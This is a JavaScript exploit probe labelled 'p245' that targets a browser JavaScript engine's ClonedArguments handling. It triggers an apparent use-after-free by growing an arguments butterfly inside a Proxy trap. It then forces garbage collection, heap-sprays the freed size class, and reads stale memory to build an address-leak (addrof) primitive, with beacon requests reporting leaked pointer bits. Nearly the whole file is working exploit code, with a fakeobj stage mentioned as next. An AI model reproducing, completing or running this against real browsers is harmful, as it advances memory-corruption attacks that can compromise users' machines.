// p245 - addrof via ClonedArguments UAF (large butterfly growth)
//
// Key insight from p221 vs p244: MASSIVE growth forces new size class.
// p221 grew 64->1000 elements (560->8040 bytes) = different libpas tier.
// Old butterfly freed, spray reclaims it, stale pointer reads spray data.
// p244's storage conversion kept same size class -> in-place.
//
// This probe: grow massively in trap, spray typed data, extract
// pointer bits from stale read for addrof primitive.
//
// Beacon prefix: V245-

(function() {
  function B(tag, body) {
    var url = '/beacon/V245-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, body);
      else new Image().src = url;
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  function hex64(f64) {
    var buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = f64;
    var dv = new DataView(buf);
    return hex(dv.getUint32(4, false)) + hex(dv.getUint32(0, false));
  }

  B('BOOT');

  // --- addrof attempt ---
  // Place a target object at known slot. Grow butterfly in trap
  // so stale pointer reads from the OLD (freed) butterfly.
  // If spray reclaims old memory, stale read returns spray data.
  // If spray doesn't reclaim, stale read returns original JSValue
  // of target object = its raw pointer bits as float64.
  // Either way we get useful data.

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  var leakedPtrs = [];

  function doAddrof(round, targetObj) {
    var N = 64;
    var HOLE = 5;
    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (i === 0 || i === 1 || i === 2) {
        argArr.push(targetObj); // target at known slots
      } else if (i === HOLE) {
        argArr.push('HOLE_SLOT');
      } else {
        argArr.push(i + 0.123456789); // distinguishable doubles
      }
    }

    var args = target.apply(null, argArr);
    delete args[HOLE];

    var trapFired = false;
    var sprayData = [];

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        // Massive growth: 64 -> 2000 (560B -> 16040B)
        // Forces new libpas size class, old butterfly orphaned
        for (var j = 100; j < 2000; j++) {
          args[j] = 0x41414141;
        }

        // Heavy GC to free old butterfly
        for (var g = 0; g < 60; g++) {
          var junk = [];
          for (var k = 0; k < 10000; k++) junk.push({x: k, y: String(k)});
          junk = null;
        }
        for (var g2 = 0; g2 < 40; g2++) {
          var junk2 = [];
          for (var k2 = 0; k2 < 10000; k2++) junk2.push({a: k2});
          junk2 = null;
        }

        // Spray into old butterfly's size class (560 bytes)
        // Array(69): butterfly = 8 + 69*8 = 560 bytes
        // But we want to read as float64, so fill with known doubles
        // that we can distinguish from pointer bits
        sprayData = [];
        for (var s = 0; s < 5000; s++) {
          var arr = new Array(69);
          // Fill with distinctive double pattern per slot
          // Slot 0-2 should overlap where target objects were
          for (var f = 0; f < 69; f++) {
            // Use a value that's clearly identifiable:
            // NaN-box pattern for SMI: 0xfffe000000000000 | value
            // We use raw doubles that have recognizable hex patterns
            arr[f] = 6.6260693e-34 + f * 1e-40 + s * 1e-44;
          }
          sprayData.push(arr);
        }

        // Also spray exact size-class neighbors
        for (var s2 = 0; s2 < 1000; s2++) {
          var arr2 = new Array(68);
          for (var f2 = 0; f2 < 68; f2++) arr2[f2] = 6.6260693e-34 + f2 * 1e-40 + s2 * 1e-44;
          sprayData.push(arr2);
        }

        return 'TRAP_HIT';
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }
    B('R' + round + '-TRAP-' + (trapFired ? 'YES' : 'NO'));
    B('R' + round + '-LEN-' + result.length);

    // Analyze results
    var staleCount = 0;
    var ptrCount = 0;
    var origObjCount = 0;
    var origDblCount = 0;
    var ptrValues = [];

    for (var i = 0; i < Math.min(result.length, N); i++) {
      var v = result[i];

      if (typeof v === 'object' && v === targetObj) {
        origObjCount++;
      } else if (typeof v === 'string' && v === 'HOLE_SLOT') {
        // Original string survived (shouldn't happen at HOLE)
      } else if (typeof v === 'string' && v === 'TRAP_HIT') {
        // Proxy return value at hole slot
      } else if (typeof v === 'number') {
        var expected = i + 0.123456789;
        if (i === 0 || i === 1 || i === 2) {
          // These were target objects. If we read a number here,
          // the spray replaced the data. Check if it's our spray marker.
          staleCount++;
          // Read raw bits
          var bits = hex64(v);
          B('R' + round + '-STALE-' + i + '-' + bits);
        } else if (Math.abs(v - expected) < 0.0001) {
          origDblCount++;
        } else {
          // Unexpected number - could be spray data or something else
          staleCount++;
          var bits2 = hex64(v);
          if (i <= 5) B('R' + round + '-UNK-' + i + '-' + bits2);
        }
      } else if (typeof v === 'number' || typeof v === 'undefined') {
        // Check for pointer-like values (JSC NaN-boxing: pointer has top 16 bits = 0x0000 or 0xfffe for int)
        if (typeof v === 'number') {
          var buf = new ArrayBuffer(8);
          new Float64Array(buf)[0] = v;
          var dv = new DataView(buf);
          var hi16 = dv.getUint16(6, false);
          if (hi16 === 0x0000 || hi16 === 0x0001 || hi16 === 0x0002) {
            ptrCount++;
            var addr = hex64(v);
            ptrValues.push(i + ':' + addr);
            if (ptrCount <= 5) B('R' + round + '-PTR-' + i + '-' + addr);
          }
        }
      } else if (typeof v === 'object' && v !== targetObj && v !== null) {
        // Unknown object reference from stale read
        B('R' + round + '-FAKEOBJ-' + i);
        staleCount++;
      }
    }

    B('R' + round + '-STALE-' + staleCount + '-OBJ-' + origObjCount + '-DBL-' + origDblCount + '-PTR-' + ptrCount);

    if (ptrValues.length > 0) {
      B('R' + round + '-PTRS', ptrValues.join(' '));
    }

    // If we still see the original target objects, we can try to
    // read their pointer bits via a type confusion approach.
    // Put objects in a double array via species confusion.
    if (origObjCount > 0 && staleCount === 0) {
      B('R' + round + '-NO-SPRAY-HIT-TRYING-CONFUSION');

      // Alternative: use result array itself
      // result[0] should be targetObj (object reference)
      // If we can read it as Float64, we get the raw pointer
      // Use DataView trick: put result[0] into a double array context
      try {
        var f64view = new Float64Array(1);
        // Can't directly coerce object to float64...
        // But we can check if the spray arrays themselves got the old data
        if (sprayData.length > 0) {
          var foundOld = 0;
          for (var sd = 0; sd < Math.min(sprayData.length, 100); sd++) {
            for (var si = 0; si < Math.min(sprayData[sd].length, 3); si++) {
              var sv = sprayData[sd][si];
              if (typeof sv === 'object') {
                foundOld++;
              }
            }
          }
          if (foundOld > 0) B('R' + round + '-SPRAY-OVERWRITTEN-' + foundOld);
        }
      } catch(e) {}
    }

    return {staleCount: staleCount, ptrCount: ptrCount, ptrValues: ptrValues};
  }

  // Targets for addrof
  var obj1 = {addrof_target: 1, pad: 'AAAA'};
  var arr1 = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]; // Float64Array-like

  // Run multiple rounds
  for (var r = 0; r < 5; r++) {
    var res = doAddrof(r, r < 3 ? obj1 : arr1);
    if (res && res.ptrCount > 0) {
      B('ADDROF-HIT-R' + r);
      leakedPtrs.push({round: r, ptrs: res.ptrValues});
    }
  }

  if (leakedPtrs.length > 0) {
    B('ADDROF-SUCCESS-' + leakedPtrs.length + '-ROUNDS');
  } else {
    B('ADDROF-FAIL-NO-PTRS');
  }

  // Phase 2: If we got corruption in p221 style, try fakeobj
  // Skip for now - first verify we can get controlled stale reads

  // Phase 3: Test if we can read spray data reliably
  // Use MUCH larger spray count and different size classes
  function doReliableStaleRead(round) {
    var N = 64;
    var HOLE = 7;
    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (i === HOLE) argArr.push('TRIGGER');
      else argArr.push(i + 0.111);
    }

    var args = target.apply(null, argArr);
    delete args[HOLE];

    var fired = false;
    Object.setPrototypeOf(args, new Proxy({}, {
      get: function(t, prop) {
        if (fired) return 'RE-TRAP';
        fired = true;

        // Massive growth
        for (var j = 100; j < 2000; j++) args[j] = 0x42424242;

        // Extra heavy GC
        for (var g = 0; g < 80; g++) {
          var j2 = [];
          for (var k = 0; k < 15000; k++) j2.push({z: k, w: String(k)});
          j2 = null;
        }

        // Spray with MARKER values
        // Original butterfly: 4*8 out-of-line + 8 header + 64*8 data = 552 -> size class ~560
        for (var s = 0; s < 8000; s++) {
          var arr = new Array(69);
          for (var f = 0; f < 69; f++) {
            arr[f] = 0xC0FFEE00 + f + (round * 1000);
          }
        }

        return 'PROXY_OK';
      }
    }));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('SR' + round + '-ERR'); return;
    }

    if (!result) return;

    var markers = 0;
    var orig = 0;
    for (var i = 0; i < Math.min(result.length, N); i++) {
      if (i === HOLE) continue;
      var v = result[i];
      if (typeof v === 'number') {
        var expected = i + 0.111;
        if (Math.abs(v - expected) < 0.01) orig++;
        else if (v >= 0xC0FFEE00 && v < 0xD0000000) {
          markers++;
          if (markers <= 3) B('SR' + round + '-MARKER-' + i + '-' + hex(v >>> 0));
        }
      }
    }
    B('SR' + round + '-MARKERS-' + markers + '-ORIG-' + orig);
  }

  for (var r = 0; r < 3; r++) {
    doReliableStaleRead(r);
  }

  B('DONE');
})();
